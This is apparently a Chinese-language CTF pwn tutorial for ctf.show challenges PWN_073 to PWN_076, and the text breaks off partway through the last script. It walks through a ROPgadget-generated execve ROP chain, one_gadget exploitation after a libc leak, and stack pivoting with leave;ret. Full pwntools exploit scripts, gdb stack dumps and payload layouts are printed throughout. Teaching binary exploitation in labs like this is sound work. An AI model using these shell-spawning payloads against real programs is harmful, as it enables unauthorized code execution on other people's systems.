\u0026#39;xor edi, edi\u0026#39; gadget. Try with another \u0026#39;mov [r], r\u0026#39; [+] Gadget found: 0x80549db mov dword ptr [edx], eax ; ret [+] Gadget found: 0x806f02a pop edx ; ret [+] Gadget found: 0x80b81c6 pop eax ; ret [+] Gadget found: 0x8049303 xor eax, eax ; ret - Step 2 -- Init syscall number gadgets [+] Gadget found: 0x8049303 xor eax, eax ; ret [+] Gadget found: 0x807a86f inc eax ; ret - Step 3 -- Init syscall arguments gadgets [+] Gadget found: 0x80481c9 pop ebx ; ret [+] Gadget found: 0x80de955 pop ecx ; ret [+] Gadget found: 0x806f02a pop edx ; ret - Step 4 -- Syscall gadget [+] Gadget found: 0x806cc25 int 0x80 - Step 5 -- Build the ROP chain #!/usr/bin/env python2 # execve generated by ROPgadget from struct import pack # Padding goes here p = \u0026#39;\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b81c6) # pop eax ; ret p += \u0026#39;/bin\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea064) # @ .data + 4 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b81c6) # pop eax ; ret p += \u0026#39;//sh\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x08049303) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080481c9) # pop ebx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080de955) # pop ecx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x08049303) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806cc25) # int 0x80 exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 from pwn import * from struct import pack context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;i386\u0026#39;) io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28192) #io = process(\u0026#39;./pwn\u0026#39;) p = cyclic(0x18+4) p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b81c6) # pop eax ; ret p += \u0026#39;/bin\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea064) # @ .data + 4 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b81c6) # pop eax ; ret p += \u0026#39;//sh\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x08049303) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080549db) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080481c9) # pop ebx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080de955) # pop ecx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806f02a) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x08049303) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a86f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806cc25) # int 0x80 io.sendline(p) io.interactive() 可以看到，它已经很智能的帮我们构造好了这些，我们仅仅需要将它构造好的payload提取出来，然后填充上偏移即可进行我们的攻击。\n这个比较类似杂项的一把梭的感觉，在这个阶段不要我们学会，当然现在的我也不会，以后就会了。\n使用前提：程序为 “静态编译” 且无现成的 system/execve 函数、关闭 PIE 且开启 NX（栈不可执行）、存在 “可控栈溢出” 且溢出空间足够。\n使用该指令的核心原因是程序为 静态编译，file pwn 显示 statically linked，且未直接提供 system、execve 等可直接 getshell 的函数：\n静态编译的程序会将所有依赖的库函数（如 read、write、int 0x80 系统调用入口）打包到自身中，不存在 “动态链接依赖 libc” 的问题，ROPgadget 能从程序自身提取到完整的 ROP 组件（如 pop edx; ret、mov [edx], eax; ret、int 0x80 等），足以构造出调用 execve(\u0026quot;/bin/sh\u0026quot;) 的完整 ROP 链； 若程序为动态编译（依赖外部 libc），且未泄露 libc 基址，ROPgadget 无法获取 libc 内部的 gadget（如 system 地址、/bin/sh 字符串地址），自动生成的 ROP 链会因 “缺少关键组件” 失效，无法直接使用 “一把梭”。 one_gadget攻击 PWN_074 题目：噢？好像到现在为止还没有了解到one_gadget? PWN_074\nchecksec：\n64位保护全开\u0026hellip;.我都懵了。\n相对于现阶段，看到这种保护全开的题可能会有点迷茫，但是实际上在堆阶段后面基本上都是保护全开的题比较多一点，这里也是为了让大家提前了解一些攻击手法。\nIDA64分析：\n开局直接泄露了pringtf的地址我们，但因为地址动态变化，所以我们可以泄露libc库地址，算出这个程序的函数偏移量。\n通过 __isoc99_scanf 函数从用户输入中读取一个长整数，并将其存储在 v4 数组的第一个元素中。\n再将 v4 数组的第一个元素的值赋给了数组的第二个元素。继续通过函数指针调用了 v4 数组的第一个元素所指向的函数。这个部分利用函数指针的特性，将其转换为函数并进行调用。\n使用用户输入来获取函数指针，并通过函数指针调用相应的函数。需要注意的是，这种通过用户输入来获取函数指针并调用函数的做法极有可能会带来安全隐患，因为恶意用户可以输入不安全的函数指针，导致程序出现问题。\n到这里引出下一个攻击手段——one gadget\none_gadget是libc中存在的一些执行execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL)的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。\n相比于system(\u0026quot;/bin/sh\u0026quot;)，这种方式更加方便，不用控制RDI、RSI、RDX等参数。运用于不利构造参数的情况。\n1 one_gadget /lib/x86_64-linux-gnu/libc.so.6 one_gadget并不总是可以获取shell，它首先要满足一些条件才能执行成功,后面提示就是在调用one_gadget前需要满足的条件。\n约束条件满足：one - gadget 是 libc 中执行execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL)的代码片段，但需要满足特定约束条件才能执行成功。0x4f2c5的约束条件为rsp \u0026amp; 0xf == 0且rcx == NULL ，0x4f322的约束条件为[rsp + 0x40] == NULL ，0x10a2fc的约束条件为[rsp + 0x70] == NULL。在 PWN074 场景中，程序栈布局使得[rsp + 0x70]天然为 NULL（因为该地址超出当前函数栈帧范围，属于未使用的空闲栈区域，在 Linux 系统中默认填充为 0） ，满足0x10a2fc的约束条件，而其他两个地址的约束条件难以满足。例如，rsp \u0026amp; 0xf == 0要求栈指针低 4 位为 0，在程序未提供调整栈指针对齐的可控途径时，很难实现；同时程序未对rcx寄存器进行控制，rcx大概率不为 NULL，不满足0x4f2c5的条件；[rsp + 0x40]在程序运行时存储有临时数据，无法通过用户输入清空，不满足0x4f322的条件。\n本题仅仅是一个工具引进使用，具体可以自行调试一下便知。省了很大一部分时间和精力，对于初学者来说，libc版本是个坑。因此在训练题型上平台一般弄了几个比较相对固定的libc版本，实际比赛时libc的版本更加多样复杂。\n当然，在这里如果不是使用的附带虚拟机，则需要自行去泄漏libc，当然前面经过这么多题的练习，相信这些也是没难度了。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * from struct import pack context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;,arch=\u0026#39;amd64\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28135) #io = process(\u0026#39;./pwn\u0026#39;) one_gadget = 0x10a2fc printf_libc = libc.sym[\u0026#39;printf\u0026#39;] io.recvuntil(\u0026#39;this:\u0026#39;) printf = int(io.recv(14),16) libc_base = printf - printf_libc payload = (str(one_gadget+libc_base)) io.sendline(payload) io.interactive() one_gadget + libc_base：计算得到 one_gadget 在内存中的真实地址\n*str(one_gadget+libc_base)：one_gadget + libc_base 是十进制整数），main 函数明确使用 __isoc99_scanf(\u0026quot;%ld\u0026quot;, v4) 读取用户输入，也就是说要的是用户输入的字符串，不要数值本身的意义。（one_gadget 真实地址为 0x7f8a9b12d95c（十进制数值为 140239165128028），程序要求输入的是字符串 \u0026quot;140239165128028\u0026quot;，而非数值140239165128028 本身）大概就这么理解，这是python的自身规则。\n栈迁移 栈迁移是在二进制漏洞利用（尤其是栈溢出漏洞场景）中常用的一种技术手段，目的是改变程序执行时栈的布局和执行流程，绕过一些安全防护机制， 实现攻击者想要的代码执行。\n在存在栈溢出漏洞的程序中，攻击者原本可以通过覆盖返回地址来劫持程序执行流，让程序跳转到攻击者指定的地址（如 shellcode 地址）执行恶意代码。但随着系统安全机制（如 NX 保护，使栈上数据不可执行 ）的引入或者栈空间过小，直接在栈上执行注入的 shellcode 变得困难。同时，一些程序还可能存在栈金丝雀保护（Stack Canary）来检测栈是否被非法篡改，这也增加了传统栈溢出利用的难度。因此，栈迁移技术应运而生，以绕过这些安全防护。\n问题场景 传统方法限制 栈迁移解决方案 栈溢出空间不足 ROP链无法完整布置 迁移到大容量内存区域 NX保护（栈不可执行shellcode） 无法直接执行shellcode 迁移到可执行内存区域 只能覆盖有限数据 无法控制完整控制流 只需要覆盖关键指针即可 ASLR随机化 难以预测绝对地址 使用相对稳定的堆地址 原理 改变栈的位置：正常情况下，程序按照默认的栈布局执行，栈迁移的核心是将栈的位置移动到一个对攻击者有利的地方，比如具有可写可执行权限的内存区域（如 bss 段） 。在栈溢出漏洞发生时，攻击者可以通过覆盖某些关键寄存器（如 esp，在 32 位程序中；rsp，在 64 位程序中 ）的值，使程序在后续执行中，将新的栈帧设置在攻击者指定的内存位置。 构造新栈帧：在新的栈位置，攻击者精心构造栈帧，放置需要执行的指令地址、函数参数等数据。例如，攻击者可以将 execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL) 系统调用的相关参数和指令地址按照正确的顺序放置在新栈帧中，当程序执行到相应指令时，就会按照攻击者的意图执行系统调用，获取 shell。 PWN_075 题目：栈空间不够怎么办？ PWN_075\nchecksec一下：\n32位开启NX保护，部分开启RELRO。\n随便运行一下看看：\n这是重点！后续编写exp要注意的细节。\nIDA分析，查看main中的ctfshow函数：\n其实在连靶机进行交互时，无论你输入什么，都是招原样给你打印出来的，主要还是看read、memset函数，况且没开canary保护有站处理漏洞可以利用。\n还看到了system函数。\n跟进hackerout函数：\n看到有system函数，不过里边不是binsh，问题不大可以构造出来。\n看回ctfshow函数的栈溢出漏洞，可以发现s容量是36，但s到ebp距离有0x28=40，加上覆盖ebp本身的4字节，仅 8 字节（44-36=8）溢出空间，无法直接布置system(\u0026quot;/bin/sh\u0026quot;); 所需的 ROP 链（需覆盖返回地址 + 传递参数，至少 12 字节以上），那么这里就应该要想到栈迁移了。\n栈迁移的本质是通过 leave 指令改变栈顶指针（esp）的位置，将原本狭小的栈空间转移到我们可控的大空间。那我们就得调用levae汇编指令。\nleave 指令是栈帧操作的 “便捷指令”，其本质是 自动完成栈帧的清理工作；它的功能可以拆解为两条经典指令的组合，具体行为依赖于架构（x86/x64 一致）。\nleave 指令等价于：\n1 2 mov esp, ebp ; 将栈指针(esp)指向基指针(ebp)，回收当前栈帧的局部变量空间 pop ebp ; 从栈顶弹出之前保存的ebp值（恢复上一层栈帧的基指针） 看回ctfshow函数的栈溢出漏洞，可以发现s容量是36，但s到ebp距离有0x28=40，加上覆盖ebp本身的4字节，也就是说只有8字给到我们放东西，无法进行我们的ROP链构造，那么这里就应该要想到栈迁移了。\n前置准备：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from pwn import * context.log_level=\u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28274) #io = process(\u0026#39;./pwn\u0026#39;) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] leave = 0x08048766 ... payload = cyclic(0x24) + b\u0026#39;GPNU\u0026#39; io.recvuntil(\u0026#34;codename:\u0026#34;) io.sendline(payload) io.recvuntil(\u0026#39;\u0026#39;) ... io.interactive() leave汇编指令和ebp、esp有关联，那我们就需要去获得ebp的地址。\n看回ctfshow函数以及在Ubuntu上NC连接的运行界面你就会发现第一次输入后有个ptintf函数会输出，也就是第一次输出，那我们把缓冲区给覆盖了，那么就会把ebp4字节的地址给打印出来，用后续的u32函数进行复制保存下来，这就是ebp泄露了。\n泄露ebp地址：\n1 2 3 4 5 6 7 # 构造payload1：用于泄露ebp payload = cyclic(0x24) + \u0026#39;GPNU\u0026#39; # 0x24个垃圾字符 + 标记字符串\u0026#39;show\u0026#39; io.recvuntil(\u0026#39;codename:\u0026#39;) # 等待程序输出\u0026#34;codename:\u0026#34;（根据程序交互逻辑，第一次输入的触发点） io.send(payload) # 发送payload1到程序 io.recvuntil(\u0026#39;GPNU\u0026#39;) # 接CTCT收程序输出，直到遇到标记\u0026#39;GPNU\u0026#39;（此时下一个4字节就是ebp的值） ebp = u32(io.recv(4).ljust(4, \u0026#39;\\x00\u0026#39;)) # 读取4字节并转为32位无符号整数（ebp的真实值） print(\u0026#39;ebp=\u0026#39; + hex(ebp)) # 打印ebp地址（调试用，如 0xffffd058） 找栈迁移的地方，我们要迁移到攻击者可控的全局缓冲区（通常是第一次输入时构造的、用于存储 system(\u0026quot;/bin/sh\u0026quot;) 调用和参数的内存区域）。\n栈迁移目的地：\n可以看到buf比s更靠下，说明整个栈帧中，buf空间更大（比s大），可以放gadget。\n那么现在需要明确一下思路：有两个输入点\n利用第一个输入点来泄露ebp的值，动调找一下buf在栈上的位置，用ebp去表示。\n第二个输入点输入system（/bin/sh），利用两次leave将栈迁移到buf处，执行buf里的指令，进行getshell。\n上述已经泄露好了。\nebp已经泄露了真实地址，现在需要表示出buf真实地址，那我们可以用ebp去表示buf的真实地址，那就需要固定偏移量：\n一步步来\n第一步，先运行这个调试代码（python2）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * context(log_level=\u0026#39;debug\u0026#39;, os = \u0026#39;linux\u0026#39;, arch = \u0026#39;i386\u0026#39;) io = process(\u0026#39;./pwn\u0026#39;) gdb.attach(io) #io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28218) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.plt[\u0026#39;system\u0026#39;] leave = 0x08048766 payload = \u0026#39;a\u0026#39; * 0x24 + \u0026#39;GPNU\u0026#39; io.recvuntil(\u0026#39;codename:\u0026#39;) io.send(payload) io.recvuntil(\u0026#39;show\u0026#39;) ebp = u32(io.recv(4).ljust(4,\u0026#39;\\x00\u0026#39;)) pause() 第二步，右边pwndbg输入n（next）命令进行下一步，让a垃圾字符串注入程序：\n第三步，看栈帧，输入stack 50（也够了，你输入60、70也行，小点也行不过看不到ebp就尬了\u0026hellip;）\n完整结果如下（有图有代码就怕你看不懂）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 pwndbg\u0026gt; stack 50 00:0000│ esp 0xffa86830 —▸ 0xffa86898 —▸ 0xffa868a8 ◂— 0x0 01:0004│ 0xffa86834 ◂— 0x30 /* \u0026#39;0\u0026#39; */ 02:0008│ 0xffa86838 —▸ 0xffa86870 ◂— 0x61616161 (\u0026#39;aaaa\u0026#39;) 03:000c│ 0xffa8683c —▸ 0xf7e35e67 (read+39) ◂— cmp eax, 0xfffff000 /* \u0026#39;=\u0026#39; */ 04:0010│ 0xffa86840 —▸ 0xffa86898 —▸ 0xffa868a8 ◂— 0x0 05:0014│ 0xffa86844 —▸ 0xf7f65de0 (_dl_runtime_resolve+16) ◂— pop edx 06:0018│ 0xffa86848 —▸ 0xffa86890 ◂— 0x61616161 (\u0026#39;aaaa\u0026#39;) 07:001c│ 0xffa8684c —▸ 0xf7e35e40 (read) ◂— push esi 08:0020│ 0xffa86850 —▸ 0xffa86870 ◂— 0x61616161 (\u0026#39;aaaa\u0026#39;) 09:0024│ 0xffa86854 —▸ 0x804b000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804af0c (_DYNAMIC) ◂— 0x1 0a:0028│ 0xffa86858 —▸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c 0b:002c│ 0xffa8685c —▸ 0x804870e (ctfshow+53) ◂— add esp, 0x10 0c:0030│ 0xffa86860 ◂— 0x0 0d:0034│ 0xffa86864 —▸ 0xffa86870 ◂— 0x61616161 (\u0026#39;aaaa\u0026#39;) 0e:0038│ 0xffa86868 ◂— 0x30 /* \u0026#39;0\u0026#39; */ 0f:003c│ 0xffa8686c —▸ 0x80486e5 (ctfshow+12) ◂— add ebx, 0x291b 10:0040│ ecx 0xffa86870 ◂— 0x61616161 (\u0026#39;aaaa\u0026#39;) ... ↓ 19:0064│ 0xffa86894 ◂— 0x554e5047 (\u0026#39;GPNU\u0026#39;) 1a:0068│ ebp 0xffa86898 —▸ 0xffa868a8 ◂— 0x0 1b:006c│ 0xffa8689c —▸ 0x80487b5 (main+77) ◂— mov eax, 0 1c:0070│ 0xffa868a0 —▸ 0xffa868c0 ◂— 0x1 1d:0074│ 0xffa868a4 ◂— 0x0 ... ↓ 1f:007c│ 0xffa868ac —▸ 0xf7d67fa1 (__libc_start_main+241) ◂— add esp, 0x10 20:0080│ 0xffa868b0 —▸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c ... ↓ 22:0088│ 0xffa868b8 ◂— 0x0 23:008c│ 0xffa868bc —▸ 0xf7d67fa1 (__libc_start_main+241) ◂— add esp, 0x10 24:0090│ 0xffa868c0 ◂— 0x1 25:0094│ 0xffa868c4 —▸ 0xffa86954 —▸ 0xffa8721f ◂— \u0026#39;./pwn\u0026#39; 26:0098│ 0xffa868c8 —▸ 0xffa8695c —▸ 0xffa87225 ◂— \u0026#39;LC_NUMERIC=zh_CN.UTF-8\u0026#39; 27:009c│ 0xffa868cc —▸ 0xffa868e4 ◂— 0x0 28:00a0│ 0xffa868d0 ◂— 0x1 29:00a4│ 0xffa868d4 ◂— 0x0 2a:00a8│ 0xffa868d8 —▸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c 2b:00ac│ 0xffa868dc —▸ 0xf7f6071a (call_init.part+26) ◂— add edi, 0x178e6 2c:00b0│ 0xffa868e0 —▸ 0xf7f78000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x26f34 2d:00b4│ 0xffa868e4 ◂— 0x0 2e:00b8│ 0xffa868e8 —▸ 0xf7f27000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d8c 2f:00bc│ 0xffa868ec ◂— 0x0 ... ↓ 31:00c4│ 0xffa868f4 ◂— 0xfa28923b 可以看到“GPNU”、“aaaa”字符串都被注入到程序里啦，能看到esp和ebp距离，算一算就是0x38（0xffa868a8-0xffa86870）。\n这里的 0x38 是 ebp 到 “目标可控缓冲区” 的固定偏移，我们可以用ebp-0x38来表示buf的地址。\n在第一次输入完后，进入到第二次输入，我们要往buf中写入system(\u0026quot;/bin/sh\u0026quot;),同时还要将栈劫持返回buf地址，然后就执行了我们想要的system(\u0026quot;/bin/sh\u0026quot;);\n构造payload:\n1 2 # 构造payload：布置system调用 + 栈迁移指令 payload = (p32(system) + p32(0) + p32(buf + 12) + \u0026#39;/bin/sh\\x00\u0026#39;).ljust(0x28, \u0026#39;a\u0026#39;) + p32(buf - 4) + p32(leave) 程序有给system函数，直接调用。\n我们在构造 Payload 时，会将 system 调用相关的代码提前布置到 buf 中，而 buf 作为栈迁移的目标缓冲区，其内部字节布局是固定的（32 位系统下，每个指针 / 地址占 4 字节）\nPayload 整体分为 “攻击代码段” 和 “栈迁移控制段” 两部分:\n1、攻击代码段：\n1 (p32(system) + \u0026#39;aaaa\u0026#39; + p32(buf + 12) + \u0026#39;/bin/sh\\x00\u0026#39;).ljust(0x28,\u0026#39;a\u0026#39;) 内存地址范围 存储内容 占用字节 作用说明 buf 0 ~ buf + 3 system 函数地址 4 触发 system 调用的入口 buf 0 + 4 ~ buf + 7 垃圾数据p32(\u0026lsquo;aaaa\u0026rsquo;) || p32(0) 4 占位 system 调用后的 “返回地址” buf 0 + 8 ~ buf + 11 buf 0 + 12（参数地址） 4 指向 /bin/sh\\x00 的地址，即 system 的参数 buf 0 + 12 ~ 后续 /bin/sh\\x00 字符串 8 system 调用的核心参数（需以 \\x00 结尾确保字符串终止） 为什么是 buf + 12？\n从上述布局可知，/bin/sh\\x00 字符串的起始地址恰好是 buf + 12，原因是：\n前 3 个 “4 字节块”（system 地址、垃圾数据、参数地址）共占用 3 × 4 = 12 字节； 因此，/bin/sh\\x00 会从 buf 起始地址向后偏移 12 字节的位置开始存储，即 buf + 12。 2、栈迁移控制段：\n1 p32(buf - 4) + p32(leave) 各字段功能如下：\n字段 内容 / 作用 关联文档依据 p32(buf - 4) 覆盖栈上的 ebp 寄存器为 buf - 4：这是 “假 ebp”，为后续 leave 指令第一步（mov esp, ebp）做准备 buf - 4 是为 pop ebp 留位 p32(leave) 覆盖栈上的 “返回地址” 为 leave 指令地址（leave = 0x08048766）：让程序执行完当前函数后，优先执行 leave 指令触发栈迁移 leave 指令 = mov esp, ebp; pop ebp p32(buf-4) 是将ebp覆盖成buf的地址-4 为什么要-4？这是因为我们利用的是两个leave，但是第二个leave的pop ebp，在出栈的时候会esp+4。就会指向esp+4的位置，p32(leave) ,将返回地址覆盖成leave，到这里，我们成功将栈劫持到了我们的buf处，接下来就会执行栈里的内容。累死了！！！\n完整exp（python2）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * context(log_level=\u0026#39;debug\u0026#39;, os = \u0026#39;linux\u0026#39;, arch = \u0026#39;i386\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) #gdb.attach(io) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28229) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.plt[\u0026#39;system\u0026#39;] leave = 0x08048766 payload = \u0026#39;a\u0026#39; * 0x24 + \u0026#39;GPNU\u0026#39; io.recvuntil(\u0026#39;codename:\u0026#39;) io.send(payload) io.recvuntil(\u0026#39;GPNU\u0026#39;) ebp = u32(io.recv(4).ljust(4,\u0026#39;\\x00\u0026#39;)) #pause() print(\u0026#39;ebp=\u0026#39;+hex(ebp)) buf = ebp - 0x38 payload = (p32(system) + \u0026#39;aaaa\u0026#39; + p32(buf + 12) + \u0026#39;/bin/sh\\x00\u0026#39;).ljust(0x28,\u0026#39;a\u0026#39;) + p32(buf-4) + p32(leave) io.send(payload) #pause() io.interactive() 总结：这个栈迁移手法还是比较重要的，为数不多栈考点的难点之一，重在使用gdb调试出固定偏移和payload构造，对栈帧结构要加深理解。\nPWN_076 题目：还是那句话，理清逻辑很重要； PWN_076\nchecksec一下：\n32位关闭PIE部分开启RELRO，栈保护与NX是开启的，这里在IDA查看后发现像是静态编译的，用指令确认看一下：\nIDA分析函数：\n等等？？\n我当年杂项入门CTF的，这东西我看很敏感的😄。\n跟进Base64Decode函数：\n说实话看不懂这函数在干嘛的，直接上gdb调试：\n按照函数表面意思，我初步判断是一个base64的解码函数，那我就将一段base64编码注入进程序让它解码，由调试界面可知，我的推断是正确的。\n当然初期使用gdb调试会比较慢上手，但如果是直接进行伪代码代码审计的话一定会劝退你学PWN的，我鼓励大家多使用gdb调试，能节省一点时间去理解代码。当然，不可否认，大部分时间都是没错的，这里也仅仅是为了提醒一下大家。（你看到的东西不一定都是对的！！！我一直强调过很多遍，希望能在今后帮助到大家）\n跟进correct函数，发现后门函数！！\n跟进auth函数：\nauth函数会生成解码内容的md5哈希值，并且与程序中保存的哈希值进行对比\n重看main函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [esp+18h] [ebp-28h] BYREF char s[30]; // [esp+1Eh] [ebp-22h] BYREF unsigned int v6; // [esp+3Ch] [ebp-4h] memset(s, 0, sizeof(s)); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); printf(\u0026#34;CTFshow login: \u0026#34;); _isoc99_scanf(\u0026#34;%30s\u0026#34;, s); memset(\u0026amp;input, 0, 0xCu); v4 = 0; v6 = Base64Decode((int)s, \u0026amp;v4); if ( v6 \u0026gt; 12 ) { puts(\u0026#34;Input Error!\u0026#34;); } else { memcpy(\u0026amp;input, v4, v6); if ( auth(v6) ) correct(); } return 0; } v7是base64解码后的长度，当v7 \u0026gt; 0xC(十进制 12)的时候，会输出“Input Error!”然后退出进程。\nmemcpy(\u0026amp;input, v5, v7);会把从 v5 开始的 v7 个字节的数据，完整地复制到 input 变量所在的内存地址处。（这里有个坑，就是如果对伪代码不熟悉的话，你会误以为这是input函数的地址，其实这个input 是一个数据存储的变量（参数）😄）；要注意的是，input参数被控制在12字节（0xC）大小内，不足与我们进行注入payload，那我们就需要进行栈迁移\n看回汇编代码：\n在最后结束时给我们执行了一次leave汇编指令。\n栈迁移到哪？\n在main函数中，还有一个memcpy，把解码后的数据copy填充到了input地址处，在程序关闭PIE的情况下，input的地址已知，我们可以通过栈劫持指针的方式，把数据布置到input所在的bss段：\n大致思路就是栈迁移调用/bin/sh来gethell，不过需要事先将payload进行一次base64编码加密，因为程序会将我们注入的payload进行一次base64编码解码。\npayload：\n1 2 3 4 input_bss_address = 0x811EB40 binsh = 0x8049284 payload1 = cyclic(4) + p32(binsh) + p32(input_bss_address) payload = payload1.encode(\u0026#39;base64\u0026#39;) main函数有leave ret == move esp ebp; pop ebp;ret;\n所以esp寄存器的值要+4（pop弹栈会多出四个字节空间，需要用4字节垃圾值填充），所以payload的前四个字节填充垃圾数据。\npython2的exp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * 